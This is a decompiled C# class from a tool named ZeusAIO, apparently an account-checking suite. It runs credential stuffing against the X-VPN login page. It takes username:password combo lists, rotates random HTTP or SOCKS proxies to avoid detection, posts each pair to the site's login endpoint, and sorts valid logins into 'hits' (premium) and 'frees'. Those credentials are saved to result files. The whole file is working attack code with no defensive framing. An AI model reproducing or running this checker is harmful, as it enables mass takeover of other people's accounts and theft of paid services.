// Decompiled with JetBrains decompiler
// Type: XVPN.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace XVPN
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = " Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "Username=" + s[0] + "&Password=" + s[1];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://xvpn.io/?n=best.free.xvpn.LoginAction", str1, "application/x-www-form-urlencoded").ToString();
              if (str2.Contains("{\"type\":\"redirect\",\"msg\":\"\",\"url\":\"/?n=best.free.xvpn.AccountPage\"}"))
              {
                httpRequest.AddHeader("authority", " xvpn.io");
                httpRequest.AddHeader("path", "/?n=best.free.xvpn.AccountPage");
                httpRequest.AddHeader("upgrade-insecure-requests", " 1");
                if (httpRequest.Get("https://xvpn.io/?n=best.free.xvpn.AccountPage").ToString().Contains("Your account does not have an active premium."))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[FREE - X-VPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                  Export.AsResult("/Xvpn_frees", s[0] + ":" + s[1]);
                  return false;
                }
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - X-VPN] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Xvpn_hits", s[0] + ":" + s[1]);
                return false;
              }
              if (!str2.Contains("This email doesn't exist, try another?"))
              {
                if (str2.Contains("The password is incorrect"))
                  break;
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
